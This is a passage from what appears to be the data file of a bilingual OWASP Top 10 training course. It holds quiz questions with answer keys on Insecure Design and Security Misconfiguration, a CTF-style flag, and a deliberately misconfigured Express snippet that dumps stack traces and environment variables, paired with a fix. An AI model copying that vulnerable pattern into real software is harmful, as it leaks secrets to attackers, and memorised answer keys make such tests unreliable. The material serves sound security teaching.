        e: M('Против scalping: rate limiting покупок per account/IP, behavioral analysis и лимиты количества на аккаунт, заложенные в flow. Только «честные пользователи» в UI не останавливают ботов.', 'Against scalping: purchase rate limits per account/IP, behavioral signals, and per-account quantity caps in the flow. UI-only “honest user” assumptions fail against bots.'),
      },
      {
        q: M('Почему «единая точка отказа» (single point of failure) для security-контроля — пример плохого дизайна?', 'Why is a "single point of failure" for a security control an example of poor design?'),
        opts: [
          M('SPOF — это только про доступность (availability), не про security', 'SPOF is only about availability, not security'),
          M('Если весь security полагается на один непроверяемый механизм без резервных/дополняющих слоёв защиты (defense-in-depth), компрометация этого единственного механизма ведёт к полному провалу защиты', 'If the entire security posture relies on one unverifiable mechanism with no supporting/defense-in-depth layers, compromising that single mechanism leads to a complete protection failure'),
          M('Это не относится к безопасности', 'It\'s unrelated to security'),
          M('SPOF невозможен в современных системах', 'SPOFs are impossible in modern systems'),
        ],
        ans: 1,
        e: M('Single point of failure security control: вся защита на одном непроверяемом механизме без defense-in-depth. Падение/обход одной точки обнуляет безопасность — плохой дизайн.', 'A security single point of failure puts all protection on one unverifiable mechanism with no defense-in-depth. If that point fails or is bypassed, security collapses — poor design.'),
      },
      {
        q: M('Что из перечисленного — пример правильного «fail securely» дизайна платежной системы (пересекается с A10, но закладывается на этапе A06)?', 'Which of the following is a correct example of a "fail securely" design for a payment system (overlapping with A10, but established at the A06 stage)?'),
        opts: [
          M('Игнорировать сбои проверки', 'Ignore failures'),
          M('При сбое проверки лимита транзакции — по умолчанию разрешить транзакцию (fail open)', 'When a transaction-limit check fails, allow the transaction by default (fail open)'),
          M('При сбое проверки лимита транзакции — по умолчанию отклонить транзакцию и залогировать инцидент (fail closed)', 'When a transaction-limit check fails, deny the transaction by default and log the incident (fail closed)'),
          M('Повторить транзакцию автоматически без логирования', 'Automatically retry the transaction without logging'),
        ],
        ans: 2,
        e: M('Fail securely: при сбое проверки лимита транзакции — deny by default и лог (fail closed), а не «пропустить». Иначе отказ контроля становится открытой дверью.', 'Fail securely: if a transaction-limit check fails, deny by default and log (fail closed), never “allow through.” Otherwise control failure becomes an open door.'),
      },
      {
        q: M('Согласно OWASP, недостаточность threat modeling чаще всего проявляется в:', 'Per OWASP, insufficient threat modeling most often manifests as:'),
        opts: [
          M('отсутствии CI/CD', 'lack of CI/CD'),
          M('устаревшей документации API', 'outdated API docs'),
          M('отсутствии тестирования производительности', 'lack of performance testing'),
          M('неучтённых на этапе дизайна сценариях злоупотребления/атаки, которые обнаруживаются только постфактум через инцидент или пентест', 'unaccounted-for abuse/attack scenarios at the design stage that are only discovered later via an incident or pentest'),
        ],
        ans: 3,
        e: M('Недостаточный threat modeling чаще проявляется как неучтённые abuse/attack-сценарии, обнаруженные только инцидентом или пентестом. Пробел на design stage догоняет позже.', 'Weak threat modeling most often shows up as abuse/attack scenarios missed at design and found only via incident or pentest. Design-stage gaps catch up later.'),
      },
      {
        q: M('Пример business logic flaw в e-commerce: возможность применить один и тот же промокод «первая покупка -50%» многократно на разные заказы того же пользователя из-за отсутствия проверки истории использования. Это относится к:', 'A business logic flaw example in e-commerce: the ability to apply the same "first purchase -50%" promo code multiple times to different orders from the same user, due to no check of prior usage. This falls under:'),
        opts: [
          M('Insecure Design (недостаточность бизнес-правил в архитектуре)', 'Insecure Design (insufficient business-rule enforcement in the architecture)'),
          M('SQL Injection', 'SQL Injection'),
          M('SSRF', 'SSRF'),
          M('XSS', 'XSS'),
        ],
        ans: 0,
        e: M('Повторное применение «first-order» скидки — Insecure Design: business rules не enforce’ятся архитектурой. Нужны идемпотентность, учёт использования и серверные ограничения.', 'Reusing a “first-order” discount is Insecure Design: business rules are not enforced in the architecture. Need idempotency, usage tracking, and server-side limits.'),
      },
      {
        q: M('Что из перечисленного — правильный подход к тестированию race condition на пентесте?', 'What\'s the correct approach to testing for race conditions during a pentest?'),
        opts: [
          M('Проверка версии TLS', 'Checking the TLS version'),
          M('Одновременная (параллельная) отправка идентичных запросов через инструменты типа Burp Turbo Intruder/специализированные скрипты для минимизации сетевой задержки между запросами', 'Sending identical requests simultaneously (in parallel) via tools like Burp Turbo Intruder/specialized scripts to minimize network latency between requests'),
          M('Проверка только через UI вручную одним запросом', 'Testing only via the UI manually with a single request'),
          M('Отправка запросов строго последовательно с задержкой', 'Sending requests strictly sequentially with a delay'),
        ],
        ans: 1,
        e: M('Гонки тестируют параллельной отправкой одинаковых запросов (Turbo Intruder и аналоги) и проверкой инвариантов (баланс, остатки). Последовательный ручной клик race не воспроизводит.', 'Test races by sending identical requests in parallel (Turbo Intruder etc.) and checking invariants (balance, stock). Sequential manual clicks do not reproduce races.'),
      },
      {
        q: M('Почему «design review» должен быть отдельным этапом от «code review» в SDLC?', 'Why should "design review" be a separate stage from "code review" in the SDLC?'),
        opts: [
          M('Это одно и то же, разделение не нужно', 'They\'re the same thing, no separation needed'),
          M('Design review проводится только после релиза', 'Design review is only done after release'),
          M('Code review проверяет корректность реализации существующего дизайна, design review — адекватность самого дизайна архитектурным угрозам до написания кода', 'Code review checks correctness of an existing design\'s implementation; design review checks the adequacy of the design itself against architectural threats, before code is written'),
          M('Design review не требуется для веб-приложений', 'Design review isn\'t required for web apps'),
        ],
        ans: 2,
        e: M('Design review проверяет адекватность модели и наличие контролей; code review — корректность реализации уже выбранного дизайна. Это разные стадии SDLC с разными вопросами.', 'Design review checks whether the model and controls are adequate; code review checks correct implementation of an already chosen design. Different SDLC stages, different questions.'),
      },
      {
        q: M('Что из перечисленного — пример недостаточного дизайна процесса восстановления пароля, ведущего к account takeover?', 'Which of the following is an example of insufficient password-reset process design leading to account takeover?'),
        opts: [
          M('Rate limiting на форме логина', 'Rate limiting on the login form'),
          M('Использование bcrypt для хранения пароля', 'Using bcrypt to store the password'),
          M('Использование HTTPS для формы восстановления', 'Using HTTPS for the recovery form'),
          M('Процесс восстановления полагается только на секретный вопрос с легко угадываемым/публично известным ответом (например, «девичья фамилия матери»), заложенный в архитектуру без альтернативы', 'The recovery process relies solely on a secret question with an easily guessable/publicly known answer (e.g., "mother\'s maiden name"), baked into the architecture with no alternative'),
        ],
        ans: 3,
        e: M('Сброс пароля только через легко угадываемый secret question — плохой дизайн recovery-процесса. Нужны криптостойкие токены, MFA-каналы и сроки жизни, а не публичные «ответы».', 'Password reset solely via an easily guessed secret question is poor recovery-process design. Use strong tokens, MFA channels, and TTLs—not public “answers.”'),
      },
      {
        q: M('Согласно принципам Insecure Design, «избыточное доверие к клиентской стороне» (client-side trust) проявляется, когда:', 'Per Insecure Design principles, "excessive client-side trust" manifests when:'),
        opts: [
          M('бизнес-логика (например, расчёт цены товара) частично или полностью выполняется/проверяется на клиенте, и сервер принимает итоговое значение от клиента без пересчёта', 'business logic (e.g., calculating an item\'s price) is partially or fully performed/verified on the client, and the server accepts the client\'s final value without recalculating it'),
          M('клиент не имеет доступа к API', 'the client has no API access'),
          M('сервер полностью валидирует все данные независимо от клиента', 'the server fully validates all data independently of the client'),
          M('используется HTTPS', 'HTTPS is used'),
        ],
        ans: 0,
        e: M('Excessive client-side trust: бизнес-логика (цена, скидки) считается/доверяется на клиенте без серверной валидации. Клиент атакующий контролирует, сервер должен enforce’ить правила.', 'Excessive client-side trust means business logic (price, discounts) is computed/trusted on the client without server enforcement. Attackers control the client; the server must enforce rules.'),
      },
      {
        q: M('Что из перечисленного — пример правильной архитектуры multi-tenant SaaS с точки зрения secure design?', 'Which of the following is a correct example of secure multi-tenant SaaS architecture from a secure-design standpoint?'),
        opts: [
          M('Общая таблица без tenant_id вообще', 'A shared table with no tenant_id at all'),
          M('Строгая изоляция данных на уровне архитектуры (отдельные схемы/tenant_id как обязательный enforced-фильтр на уровне ORM/middleware для каждого запроса)', 'Strict data isolation built into the architecture (separate schemas/tenant_id as a mandatory, enforced filter at the ORM/middleware level for every request)'),
          M('Полагание только на UI-фильтрацию по tenant', 'Relying only on UI-level filtering by tenant'),
          M('Отсутствие проверки tenant вообще, так как «это неудобно для разработки»', 'No tenant check at all, "because it\'s inconvenient for development"'),
        ],
        ans: 1,
        e: M('Secure multi-tenant: изоляция данных в архитектуре (отдельные schema / обязательный enforceable tenant_id). «Надеемся, что разработчик не забудет WHERE» — не дизайн.', 'Secure multi-tenant design isolates data architecturally (separate schemas / mandatory enforceable tenant_id). “Hope the developer remembers WHERE” is not a design.'),
      },
      {
        q: M('Почему «недостаточно продуманный» workflow одобрения (approval workflow) — например, отсутствие проверки, что одобряющий не является тем же лицом, что запрашивающий (segregation of duties) — относится к Insecure Design?', 'Why does an "insufficiently thought-through" approval workflow — e.g., no check that the approver isn\'t the same person as the requester (segregation of duties) — fall under Insecure Design?'),
        opts: [
          M('Это невозможно предотвратить архитектурно', 'This can\'t be prevented architecturally'),
          M('Не относится к веб-приложениям', 'It\'s unrelated to web applications'),
          M('Отсутствие архитектурного разделения ролей запрашивающего/одобряющего позволяет одному скомпрометированному или недобросовестному аккаунту одобрить собственный запрос (например, повышение прав, крупный перевод)', 'The lack of an architectural separation between requester and approver roles lets a single compromised or dishonest account approve its own request (e.g., a privilege escalation, a large transfer)'),
          M('Это относится только к HR-процессам, не к ИБ', 'It\'s only relevant to HR processes, not InfoSec'),
        ],
        ans: 2,
        e: M('Workflow без разделения requester/approver даёт одному скомпрометированному аккаунту полный цикл согласования. Архитектурное SoD (segregation of duties) — обязательный design control.', 'A workflow without requester/approver separation lets one compromised account complete the whole approval chain. Architectural segregation of duties is a required design control.'),
      },
      {
        q: M('Что из перечисленного лучше всего описывает подход «secure by default» в контексте Insecure Design?', 'Which of the following best describes the "secure by default" approach in the context of Insecure Design?'),
        opts: [
          M('Все настройки безопасности отключены по умолчанию для удобства пользователя', 'All security settings are disabled by default for user convenience'),
          M('Не имеет отношения к дизайну', 'It\'s unrelated to design'),
          M('Secure by default относится только к паролям', 'Secure by default only applies to passwords'),
          M('Система по умолчанию сконфигурирована максимально безопасно, и пользователь должен осознанно ослабить защиту, если это необходимо, а не наоборот', 'The system is configured as securely as possible by default, and the user must deliberately weaken protection if needed, rather than the reverse'),
        ],
        ans: 3,
        e: M('Secure by default: система изначально максимально безопасна, а ослабление — сознательное действие пользователя/админа. Это design/product principle, снижающий accidental exposure.', 'Secure by default means the system starts as secure as practical; weakening it is a deliberate user/admin act. That design/product principle reduces accidental exposure.'),
      },
      {
        q: M('Пример архитектурного просчёта: система бронирования не предусматривает лимит на количество одновременных «удержаний» (holds) мест одним пользователем, что позволяет заблокировать весь инвентарь без реальной покупки. Это:', 'An example of an architectural oversight: a booking system doesn\'t limit the number of simultaneous "holds" one user can place on seats, allowing the entire inventory to be locked up without any real purchase. This is:'),
        opts: [
          M('Insecure Design / resource exhaustion через бизнес-логику', 'Insecure Design / resource exhaustion via business logic'),
          M('Broken Authentication', 'Broken Authentication'),
          M('XSS', 'XSS'),
          M('SQL Injection', 'SQL Injection'),
        ],
        ans: 0,
        e: M('Букинг без лимита «зависших» резервов — Insecure Design / resource exhaustion через бизнес-логику: можно заблокировать весь inventory. Нужны TTL холдов и лимиты на аккаунт.', 'Booking without limits on hanging holds is Insecure Design / resource exhaustion via business logic: inventory can be locked out. Need hold TTLs and per-account caps.'),
      },
      {
        q: M('Согласно рекомендациям OWASP по Insecure Design, «limit resource consumption by user or service» должно применяться на уровне:', 'Per OWASP\'s Insecure Design guidance, "limit resource consumption by user or service" should be applied at the level of:'),
        opts: [
          M('только базы данных', 'only the database'),
          M('архитектуры приложения и API — транзакций, запросов, пользовательских действий, а не только на уровне инфраструктуры', 'the application and API architecture — transactions, requests, user actions — not only infrastructure'),
          M('только фронтенда', 'only the frontend'),
          M('только сетевого firewall', 'only the network firewall'),
        ],
        ans: 1,
        e: M('Лимиты потребления ресурсов по OWASP — на уровне app/API: транзакции, запросы, действия пользователя, а не только infra quotas. Иначе abuse бизнес-операций остаётся открытым.', 'Per OWASP, resource limits belong in app/API architecture: transactions, requests, user actions—not only infra quotas. Otherwise business-operation abuse remains open.'),
      },
      {
        q: M('Почему «доверие к третьей стороне без верификации» (например, автоматическое принятие вебхука от партнёра без проверки подписи) относится к Insecure Design?', 'Why does "trusting a third party without verification" (e.g., automatically accepting a webhook from a partner without checking its signature) fall under Insecure Design?'),
        opts: [
          M('Вебхуки всегда безопасны', 'Webhooks are always safe'),
          M('Не относится к дизайну, это Injection', 'It\'s unrelated to design, it\'s Injection'),
          M('Если архитектура изначально не предусматривает верификацию источника/подписи входящих вебхуков, любой, кто узнает URL, может подделать событие', 'If the architecture never accounts for verifying the source/signature of incoming webhooks, anyone who learns the URL can forge an event'),
          M('Вебхуки не используются в enterprise-системах', 'Webhooks aren\'t used in enterprise systems'),
        ],
        ans: 2,
        e: M('Доверие к third-party webhook без проверки подписи/источника — Insecure Design: любой, кто знает URL, может слать события. Архитектура должна закладывать верификацию входов.', 'Trusting third-party webhooks without signature/source verification is Insecure Design: anyone who knows the URL can inject events. Architecture must require inbound verification.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ комплексно снижает риск категории Insecure Design в организации в целом?', 'Which measure MOST comprehensively reduces an organization\'s overall risk from the Insecure Design category?'),
        opts: [
          M('Использование только антивируса на серверах', 'Only using antivirus on servers'),
          M('Только регулярное сканирование уязвимостей после релиза', 'Only regular post-release vulnerability scanning'),
          M('Увеличение частоты релизов без изменения процесса', 'Increasing release frequency without changing the process'),
          M('Интеграция threat modeling и security requirements в самый ранний этап SDLC (до написания кода) как обязательный процесс для критичных фич, плюс переиспользуемые secure-паттерны', 'Integrating threat modeling and security requirements into the earliest stage of the SDLC (before code is written) as a mandatory process for critical features, plus reusable secure patterns'),
        ],
        ans: 3,
        e: M('Наиболее комплексно риск Insecure Design снижает встраивание threat modeling и security requirements в самый ранний SDLC — до кода. Поздние патчи не заменяют secure-by-design.', 'The broadest reduction of Insecure Design risk is integrating threat modeling and security requirements at the earliest SDLC stage—before code. Late patches do not replace secure-by-design.'),
      },
    ],
  },
  {
    code: 'A05', name: 'Security Misconfiguration', nameRu: 'Неправильная конфигурация',
    risk: 'HIGH', owasp2021: 'A05', owasp2025: 'A02',
    cwe: ['CWE-16', 'CWE-200', 'CWE-1188'],
    flag: 'FLAG{debug_mode_leaks_secret_key}',
    blurb: M('Режим отладки, стандартные пароли, открытые хранилища S3 и подробные сообщения об ошибках.', 'DEBUG=True, default passwords, open S3, verbose errors.'),
    theory: M(
`<p><strong>Security Misconfiguration</strong> — ошибки на любом уровне: app, framework, web server, DB, cloud.</p>
<div class="ebox">DEBUG = True                 # stack traces + env
SECRET_KEY = 'django-insecure-xxx'
ALLOWED_HOSTS = ['*']
Access-Control-Allow-Origin: *</div>
<p><strong>CVE-2017-5638 Struts</strong> (Equifax), open buckets, default creds IoT.</p>`,
`<p><strong>Security Misconfiguration</strong> — mistakes at any stack layer: app, framework, web server, DB, cloud.</p>
<div class="ebox">DEBUG = True                 # stack traces + env
SECRET_KEY = 'django-insecure-xxx'
ALLOWED_HOSTS = ['*']
Access-Control-Allow-Origin: *</div>
<p><strong>CVE-2017-5638 Struts</strong> (Equifax), open buckets, default IoT creds.</p>`
    ),
    vulnCode: `// Production misconfig
app.set('env', 'development');
app.use(errorHandler({ dumpExceptions: true }));
// → full stack + process.env in response`,
    fixCode: `app.set('env', 'production');
app.use((err, req, res, next) => {
  log.error(err); // internal only
  res.status(500).json({ error: 'Internal error' });
});`,
    quiz: [
      {
        q: M('Security Misconfiguration поднялась с #5 (2021) на #2 (2025) место в рейтинге в основном из-за:', 'Security Misconfiguration jumped from #5 (2021) to #2 (2025) mainly because:'),
        opts: [
          M('роста числа SQL-инъекций', 'SQL injections increased'),
          M('отмены HTTPS', 'HTTPS was deprecated'),
          M('роста доли поведения приложений, задаваемого конфигурацией (cloud IaC, k8s, feature flags)', 'more application behavior is now driven by configuration (cloud IaC, k8s, feature flags)'),
          M('снижения качества паролей пользователей', 'password quality declined'),
        ],
        ans: 2,
        e: M('A02 поднялась с #5 на #2 во многом потому, что поведение систем всё чаще задаётся конфигурацией (IaC, Kubernetes, feature flags), и вес misconfiguration вырос.', 'A02 rose from #5 to #2 largely because modern systems put more behavior in configuration (IaC, Kubernetes, feature flags), so misconfiguration impact and frequency grew.'),
      },
      {
        q: M('Что из перечисленного — классический пример Security Misconfiguration?', 'Which of the following is a classic Security Misconfiguration example?'),
        opts: [
          M('Отсутствие MFA', 'Missing MFA'),
          M('Отсутствие параметризации SQL-запроса', 'Missing SQL query parameterization'),
          M('Слабый алгоритм хеширования пароля', 'A weak password-hashing algorithm'),
          M('Включённый DEBUG=True в production Django-приложении', 'DEBUG=True left enabled in a production Django app'),
        ],
        ans: 3,
        e: M('DEBUG=True в production Django — классическая misconfiguration: подробные ошибки и debug-функции раскрывают внутренности. Параметризация SQL и хеширование паролей — другие категории.', 'DEBUG=True in production Django is a classic misconfiguration: verbose errors and debug features expose internals. SQL parameterization and password hashing are other categories.'),
      },
      {
        q: M('Spring Boot Actuator, доступный без аутентификации на /actuator, — пример:', 'Spring Boot Actuator exposed without authentication at /actuator is an example of:'),
        opts: [
          M('Security Misconfiguration', 'Security Misconfiguration'),
          M('CSRF', 'CSRF'),
          M('XSS', 'XSS'),
          M('Insecure Design', 'Insecure Design'),
        ],
        ans: 0,
        e: M('Неаутентифицированный Spring Boot Actuator — открытая management-поверхность без должной защиты: классическая Security Misconfiguration, не XSS и не CSRF.', 'Unauthenticated Spring Boot Actuator is an exposed management surface left improperly secured — textbook Security Misconfiguration, not XSS or CSRF.'),
      },
      {
        q: M('Какой HTTP-метод часто оставляют включённым по ошибке, хотя он не нужен и может раскрыть заголовки запроса (XST-атака)?', 'Which HTTP method is often mistakenly left enabled, though unneeded, and can expose request headers (XST attack)?'),
        opts: [
          M('HEAD', 'HEAD'),
          M('TRACE', 'TRACE'),
          M('GET', 'GET'),
          M('POST', 'POST'),
        ],
        ans: 1,
        e: M('HTTP TRACE редко нужен в production и может отражать заголовки запроса (включая cookie) при XST. Обычно его отключают как часть hardening.', 'HTTP TRACE is rarely needed in production and can echo request headers (including cookies) for cross-site tracing (XST). It should usually be disabled as hardening.'),
      },
      {
        q: M('HSTS-заголовок относится к:', 'The HSTS header relates to:'),
        opts: [
          M('шифрованию базы данных', 'database encryption'),
          M('защите от SQL-инъекций', 'protection against SQL injection'),
          M('security misconfiguration/hardening — принудительному использованию HTTPS', 'security misconfiguration/hardening — enforcing HTTPS usage'),
          M('авторизации пользователя', 'user authorization'),
        ],
        ans: 2,
        e: M('HSTS — security-заголовок hardening, заставляющий браузер использовать HTTPS и снижающий SSL stripping и случайный cleartext — конфигурационный контроль A02.', 'HSTS is a security-hardening response header that forces browsers to use HTTPS, reducing SSL stripping and accidental cleartext visits — an A02 configuration control.'),
      },
      {
        q: M('Публично доступный S3 bucket с чувствительными данными — пример:', 'A publicly accessible S3 bucket containing sensitive data is an example of:'),
        opts: [
          M('Injection', 'Injection'),
          M('Broken Authentication', 'Broken Authentication'),
          M('XXE', 'XXE'),
          M('Misconfiguration облачного ресурса', 'cloud resource misconfiguration'),
        ],
        ans: 3,
        e: M('Публичный S3 bucket с чувствительными данными — misconfiguration ACL/политики в облаке, а не injection и не сбой логики аутентификации в коде.', 'A public S3 bucket with sensitive data is cloud ACL/policy misconfiguration, not injection or authentication logic failure in application code.'),
      },
      {
        q: M('CSP (Content-Security-Policy) относится к:', 'CSP (Content-Security-Policy) relates to:'),
        opts: [
          M('защите от XSS/некоторых видов инъекций контента через ограничение источников исполняемого кода', 'protecting against XSS/some content-injection types by restricting sources of executable code'),
          M('авторизации API', 'API authorization'),
          M('rate limiting', 'rate limiting'),
          M('шифрованию трафика', 'traffic encryption'),
        ],
        ans: 0,
        e: M('CSP ограничивает источники скриптов и другого контента, снижая XSS и часть content-injection при корректной настройке security-заголовка.', 'CSP restricts which sources may load scripts and other content, reducing XSS and some injection of executable content when correctly configured as a security header.'),
      },
      {
        q: M('Почему одинаковая конфигурация для staging и production важна для безопасности?', 'Why does keeping staging and production configurations identical matter for security?'),
        opts: [
          M('Это экономит деньги', 'It saves money'),
          M('Расхождение конфигураций между окружениями создаёт непредсказуемые уязвимости, не пойманные на этапе тестирования', 'Configuration drift between environments creates unpredictable vulnerabilities not caught during testing'),
          M('Не имеет значения для безопасности', 'It doesn\'t matter for security'),
          M('Требуется только для SOX-комплаенса', 'Required only for SOX compliance'),
        ],
        ans: 1,
        e: M('Если staging и production расходятся, тесты не ловят prod-only небезопасные настройки. Согласованность окружений снижает config drift и сюрпризы в production.', 'If staging and production configs diverge, tests miss prod-only insecure settings. Aligning environments reduces configuration drift and surprise production exposure.'),
      },
      {
        q: M('Что из перечисленного — recommended practice согласно OWASP A02:2025?', 'Which of the following is a recommended practice per OWASP A02:2025?'),
        opts: [
          M('Отключить логирование ошибок для ускорения', 'Disable error logging to speed things up'),
          M('Использовать один и тот же пароль для всех сервисных аккаунтов', 'Reuse the same password for all service accounts'),
          M('Repeatable hardening process через IaC с одинаковым применением ко всем окружениям', 'A repeatable hardening process via IaC applied consistently to every environment'),
          M('Оставлять примеры приложений и документацию по умолчанию на проде для удобства разработчиков', 'Leave sample apps and default docs on prod for developer convenience'),
        ],
        ans: 2,
        e: M('OWASP рекомендует повторяемый hardening через IaC одинаково во всех окружениях, а не samples, общие пароли или отключённое логирование на prod.', 'OWASP recommends repeatable hardening via Infrastructure as Code applied the same way in every environment, not leaving samples, shared passwords, or disabled logging on prod.'),
      },
      {
        q: M('Раскрытие стектрейса с версией фреймворка в отклике сервера при ошибке — риск, потому что:', 'Exposing a stack trace with the framework version in an error response is a risk because:'),
        opts: [
          M('нарушает GDPR напрямую', 'it directly violates GDPR'),
          M('увеличивает время ответа', 'it increases response time'),
          M('вызывает утечку памяти', 'it causes a memory leak'),
          M('даёт атакующему информацию для подбора известных CVE под конкретную версию', 'it gives an attacker information to match against known CVEs for that version'),
        ],
        ans: 3,
        e: M('Stack trace с версией фреймворка помогает сопоставить стек с известными CVE и готовить эксплойты; в production это не должно уходить конечным пользователям.', 'Stack traces with framework versions help attackers map the stack to known CVEs and craft exploits; they should not be returned to end users in production.'),
      },
      {
        q: M('Дефолтные учётные данные (admin/admin), не изменённые после установки ПО, относятся к:', 'Default credentials (admin/admin) left unchanged after installation fall under:'),
        opts: [
          M('Security Misconfiguration', 'Security Misconfiguration'),
          M('Insecure Design', 'Insecure Design'),
          M('Injection', 'Injection'),
          M('Cryptographic Failure', 'Cryptographic Failure'),
        ],
        ans: 0,
        e: M('Неизменённые default credentials admin/admin — сбой гигиены конфигурации после установки: базовый паттерн Security Misconfiguration, не выбор криптоалгоритма.', 'Leaving default admin/admin credentials is configuration hygiene failure after install — a core Security Misconfiguration pattern, not crypto algorithm design.'),
      },
      {
        q: M('Security group AWS с правилом «0.0.0.0/0» на порт 22 (SSH) — пример:', 'An AWS security group rule of "0.0.0.0/0" on port 22 (SSH) is an example of:'),
        opts: [
          M('Injection', 'Injection'),
          M('избыточно открытой сетевой конфигурации (misconfiguration)', 'an excessively open network configuration (misconfiguration)'),
          M('XSS', 'XSS'),
          M('CSRF', 'CSRF'),
        ],
        ans: 1,
        e: M('0.0.0.0/0 на SSH открывает management-доступ всему Интернету — чрезмерно permissive misconfiguration security group.', '0.0.0.0/0 on SSH opens management access to the whole Internet — an overly permissive network security-group misconfiguration.'),
      },
      {
        q: M('Заголовок X-Content-Type-Options: nosniff предотвращает:', 'The X-Content-Type-Options: nosniff header prevents:'),
        opts: [
          M('SQL-инъекции', 'SQL injection'),
          M('утечку памяти', 'memory leaks'),
          M('MIME-sniffing атаки, при которых браузер интерпретирует файл не по заявленному Content-Type', 'MIME-sniffing attacks, where the browser interprets a file differently than its declared Content-Type'),
          M('CSRF', 'CSRF'),
        ],
        ans: 2,
        e: M('X-Content-Type-Options: nosniff мешает браузеру MIME-sniff’ить ответ как другой тип, что может превратить загруженный контент в исполняемый скрипт.', 'X-Content-Type-Options: nosniff stops browsers from MIME-sniffing a response into a different type, which can turn uploaded content into executable script.'),
      },
      {
        q: M('Средний incidence rate для категории A02:2025 согласно данным OWASP составил примерно:', 'The average incidence rate for A02:2025 was approximately:'),
        opts: [
          M('0.5%', '0.5%'),
          M('15%', '15%'),
          M('50%', '50%'),
          M('3.00%', '3.00%'),
        ],
        ans: 3,
        e: M('В OWASP Top 10:2025 средняя incidence rate для A02 Security Misconfiguration указана около 3.00%.', 'OWASP Top 10:2025 cites an average incidence around 3.00% for A02 Security Misconfiguration among the category’s CWEs.'),
      },
      {
        q: M('Почему «удаление неиспользуемых фич, портов, сервисов» — важная мера hardening?', 'Why is "removing unused features, ports, and services" an important hardening measure?'),
        opts: [
          M('Уменьшает attack surface — меньше потенциальных точек эксплуатации', 'It reduces the attack surface — fewer potential points of exploitation'),
          M('Экономит место на диске', 'It saves disk space'),
          M('Требуется только для мобильных приложений', 'Required only for mobile apps'),
          M('Ускоряет компиляцию', 'It speeds up compilation'),
        ],
        ans: 0,
        e: M('Удаление неиспользуемых функций, портов и сервисов сужает attack surface: меньше слушающих сервисов и компонентов, которые можно эксплуатировать или неверно настроить.', 'Removing unused features, ports, and services shrinks the attack surface so there are fewer listening services and components to exploit or misconfigure.'),
      },
      {
        q: M('Какой инструмент чаще всего используется пентестером для проверки TLS-конфигурации сервера?', 'Which tool is most commonly used by a pentester to check a server\'s TLS configuration?'),
        opts: [
          M('sqlmap', 'sqlmap'),
          M('testssl.sh / nmap --script ssl-enum-ciphers', 'testssl.sh / nmap --script ssl-enum-ciphers'),
          M('Metasploit exploit modules только', 'Metasploit exploit modules only'),
          M('John the Ripper', 'John the Ripper'),
        ],
        ans: 1,
        e: M('testssl.sh и nmap ssl-enum-ciphers — стандартные средства проверки версий TLS, шифров и сертификатов; sqlmap и password crackers решают другие задачи.', 'testssl.sh and nmap ssl-enum-ciphers scripts are standard tools to enumerate TLS versions, ciphers, and cert issues; sqlmap and password crackers target other problems.'),
      },
      {
        q: M('Разница между Security Misconfiguration и Insecure Design (A06):', 'The difference between Security Misconfiguration and Insecure Design (A06):'),
        opts: [
          M('это одно и то же', 'they\'re the same thing'),
          M('misconfiguration относится только к сети', 'misconfiguration applies only to networking'),
          M('misconfiguration — неправильная настройка правильно спроектированного контроля; insecure design — контроль вообще отсутствует в архитектуре', 'misconfiguration is incorrectly configuring a properly designed control; insecure design means the control is entirely absent from the architecture'),
          M('insecure design относится только к паролям', 'insecure design applies only to passwords'),
        ],
        ans: 2,
        e: M('Misconfiguration — неверная настройка контроля, который должен быть; Insecure Design (A06) — контроль изначально не заложен в архитектуру.', 'Misconfiguration wrongly sets a control that should exist; Insecure Design (A06) means the security control was never designed into the architecture.'),
      },
      {
        q: M('Путь /.env, случайно доступный на веб-сервере, может раскрыть:', 'A /.env path accidentally accessible on a web server can expose:'),
        opts: [
          M('исходный код фронтенда', 'frontend source code'),
          M('историю коммитов Git', 'git commit history'),
          M('список пользователей', 'the user list'),
          M('переменные окружения — часто ключи API, пароли БД, секреты', 'environment variables — often API keys, database passwords, secrets'),
        ],
        ans: 3,
        e: M('Доступный с веба .env часто отдаёт переменные окружения с API keys, паролями БД и другими секретами — утечка конфигурации развёртывания, а не просто frontend-код.', 'A web-reachable .env often dumps environment variables with API keys, DB passwords, and other secrets — a deployment/config exposure, not just frontend source.'),
      },
      {
        q: M('Что из перечисленного — часть автоматизированной проверки конфигурации в CI/CD?', 'Which of the following is part of automated configuration checking in CI/CD?'),
        opts: [
          M('Config-as-code с автоматическими тестами, проверяющими baseline-конфигурацию перед деплоем', 'Config-as-code with automated tests verifying the baseline configuration before deployment'),
          M('Ручное тестирование каждого релиза QA-инженером', 'Manual QA testing of every release'),
          M('Использование production-данных в dev-окружении', 'Using production data in the dev environment'),
          M('Отключение всех тестов для ускорения релиза', 'Disabling all tests to speed up releases'),
        ],
        ans: 0,
        e: M('Автопроверка конфигурации в CI/CD — config-as-code и тесты baseline до деплоя, а не отключение тестов или prod-данные в dev.', 'Automated config checking in CI/CD means config-as-code plus tests that enforce the security baseline before deploy, not skipping tests or using prod data in dev.'),
      },
      {
        q: M('Почему verbose/debug-режим опасен именно в production?', 'Why is verbose/debug mode especially dangerous specifically in production?'),
        opts: [
          M('Несовместим с HTTPS', 'It\'s incompatible with HTTPS'),
          M('Раскрывает внутреннюю информацию (пути, версии, стектрейсы), полезную для атаки, которая не нужна конечному пользователю', 'It exposes internal information (paths, versions, stack traces) useful for an attack, that end users don\'t need'),
          M('Замедляет работу сервера', 'It slows down the server'),
          M('Требует больше памяти', 'It requires more memory'),
        ],
        ans: 1,
        e: M('Debug/verbose в production утекает пути, версии и stack trace, полезные атакующему и ненужные пользователям — типичный production-сбой A02.', 'Debug/verbose mode in production leaks paths, versions, and stacks useful to attackers and unnecessary for normal users — a common A02 production failure.'),
      },
      {
        q: M('Путь /swagger-ui, доступный без аутентификации, представляет риск, потому что:', 'A /swagger-ui path accessible without authentication is risky because:'),
        opts: [
          M('вызывает XSS', 'it causes XSS'),
          M('отключает CORS', 'it disables CORS'),
          M('раскрывает полную спецификацию API — все эндпоинты, параметры, структуру данных', 'it exposes the full API spec — all endpoints, parameters, data structure'),
          M('увеличивает нагрузку на сервер', 'it increases server load'),
        ],
        ans: 2,
        e: M('Публичный Swagger UI без аутентификации раскрывает всю поверхность API (endpoints, параметры, схемы), сильно упрощая разведку и целевые атаки.', 'Public unauthenticated Swagger UI reveals the full API surface (endpoints, parameters, schemas), greatly aiding reconnaissance and targeted abuse.'),
      },
      {
        q: M('Что из следующего НЕ является примером security misconfiguration?', 'Which of the following is NOT an example of security misconfiguration?'),
        opts: [
          M('Открытая панель управления кластером без аутентификации', 'An open cluster-management console without authentication'),
          M('Directory listing включён', 'Directory listing enabled'),
